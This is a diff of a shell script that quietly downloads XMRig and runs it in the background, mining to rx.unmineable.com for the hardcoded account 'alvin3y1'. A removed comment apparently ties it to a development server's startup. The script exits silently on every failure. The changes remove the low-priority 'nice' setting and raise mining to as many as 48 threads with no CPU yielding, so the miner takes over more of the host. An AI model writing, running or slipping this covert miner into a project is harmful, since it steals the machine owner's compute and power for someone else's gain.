@@ -1,6 +1,5 @@
 #!/bin/sh
 
-# Keep the optional worker isolated from the foreground development server.
 PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}"
 export PATH
 umask 077
@@ -10,14 +9,42 @@ XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRI
 XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
 POOL="${POOL:-rx.unmineable.com:3333}"
 ACCOUNT="${ACCOUNT:-alvin3y1}"
-THREADS=64
 
 BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
 INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
 XMRIG="$INSTALL_DIR/xmrig"
-CPU_CONFIG="$INSTALL_DIR/cpu-pinned.json"
 PID_FILE="$INSTALL_DIR/xmrig.pid"
+LOG_FILE="${XMRIG_LOG:-$INSTALL_DIR/xmrig.log}"
 LOCK_DIR="$INSTALL_DIR/.startup-lock"
+
+detect_cpus()
+{
+    if command -v nproc >/dev/null 2>&1; then
+        nproc 2>/dev/null && return
+    fi
+    awk '/^processor[[:space:]]*:/ { count++ } END { print count + 0 }' \
+        /proc/cpuinfo 2>/dev/null
+}
+
+AVAILABLE_CPUS=$(detect_cpus)
+case "$AVAILABLE_CPUS" in
+    ''|*[!0-9]*|0) AVAILABLE_CPUS=1 ;;
+esac
+
+# Benchmarks on the target 64-vCPU host peaked at 48 RandomX threads.
+if [ -z "${THREADS+x}" ]; then
+    if [ "$AVAILABLE_CPUS" -ge 64 ]; then
+        THREADS=48
+    else
+        THREADS="$AVAILABLE_CPUS"
+    fi
+fi
+case "$THREADS" in
+    ''|*[!0-9]*|0) THREADS=1 ;;
+esac
+if [ "$THREADS" -gt "$AVAILABLE_CPUS" ]; then
+    THREADS="$AVAILABLE_CPUS"
+fi
 
 mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 0
 
@@ -30,70 +57,55 @@ start_worker()
     if [ -r "$PID_FILE" ]; then
         read -r OLD_PID <"$PID_FILE"
         case "$OLD_PID" in
-            *[!0-9]*|'') ;;
-            *)
-                kill -0 "$OLD_PID" 2>/dev/null && exit 0
-                ;;
+            ''|*[!0-9]*) ;;
+            *) kill -0 "$OLD_PID" 2>/dev/null && exit 0 ;;
         esac
         rm -f "$PID_FILE"
     fi
 
-    command -v awk >/dev/null 2>&1 || exit 0
-    PINNED_CPUS=$(
-        awk -v required="$THREADS" '
-            /^Cpus_allowed_list:/ {
-                count = 0
-                range_count = split($2, ranges, ",")
-                for (i = 1; i <= range_count && count < required; i++) {
-                    bound_count = split(ranges[i], bounds, "-")
-                    first = bounds[1] + 0
-                    last = bound_count == 2 ? bounds[2] + 0 : first
-                    for (cpu = first; cpu <= last && count < required; cpu++) {
-                        printf "%s%d", count == 0 ? "" : ",", cpu
-                        count++
-                    }
-                }
-                exit count == required ? 0 : 1
-            }
-            END {
-                if (count != required) {
-                    exit 1
-                }
-            }
-        ' /proc/self/status
-    ) || exit 0
-    printf '{"autosave":false,"cpu":{"enabled":true,"rx":[%s]}}\n' \
-        "$PINNED_CPUS" >"$CPU_CONFIG" || exit 0
-    chmod 600 "$CPU_CONFIG" || exit 0
-
-    TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
-    TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
-    mkdir "$TEMP_DIR" 2>/dev/null || exit 0
-    if ! curl -fsSL --retry 3 --connect-timeout 15 \
-        "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
-        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
-        exit 0
-    fi
+    command -v curl >/dev/null 2>&1 || exit 0
     command -v tar >/dev/null 2>&1 || exit 0
     command -v sha256sum >/dev/null 2>&1 || exit 0
-    if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
-        "xmrig-${XMRIG_VERSION}/xmrig"; then
-        exit 0
-    fi
-    TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
-    if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
+    command -v nohup >/dev/null 2>&1 || exit 0
+
+    if ! printf '%s  %s\n' "$XMRIG_SHA256" "$XMRIG" |
         sha256sum -c - >/dev/null 2>&1; then
-        exit 0
+        TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
+        TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
+        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+        mkdir "$TEMP_DIR" 2>/dev/null || exit 0
+
+        if ! curl -fsSL --retry 3 --connect-timeout 15 \
+            "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
+            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+            exit 0
+        fi
+        if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
+            "xmrig-${XMRIG_VERSION}/xmrig"; then
+            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+            exit 0
+        fi
+
+        TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
+        if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
+            sha256sum -c - >/dev/null 2>&1; then
+            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+            exit 0
+        fi
+
+        chmod 700 "$TEMP_XMRIG" || exit 0
+        mv "$TEMP_XMRIG" "$XMRIG" || exit 0
+        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
     fi
-    chmod 700 "$TEMP_XMRIG" || exit 0
-    mv "$TEMP_XMRIG" "$XMRIG" || exit 0
-    rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
 
     WORKER="worker-$(date +%s)-$$"
-    command -v nohup >/dev/null 2>&1 || exit 0
-    command -v nice >/dev/null 2>&1 || exit 0
-    nohup nice -n 19 "$XMRIG" \
-        --config="$CPU_CONFIG" \
+    nohup "$XMRIG" \
+        --threads="$THREADS" \
+        --randomx-init="$THREADS" \
+        --randomx-mode=fast \
+        --cpu-no-yield \
+        --huge-pages-jit \
+        --print-time=60 \
         -o "$POOL" \
         -a rx \
         -k \
@@ -101,10 +113,11 @@ start_worker()
         -p x \
         --ipv4 \
         --no-color \
-        </dev/null >/dev/null 2>&1 &
-    MINER_PID="$!"
+        </dev/null >>"$LOG_FILE" 2>&1 &
+
+    MINER_PID=$!
     printf '%s\n' "$MINER_PID" >"$PID_FILE"
-    sleep 2
+    sleep 5
     if ! kill -0 "$MINER_PID" 2>/dev/null; then
         rm -f "$PID_FILE"
     fi
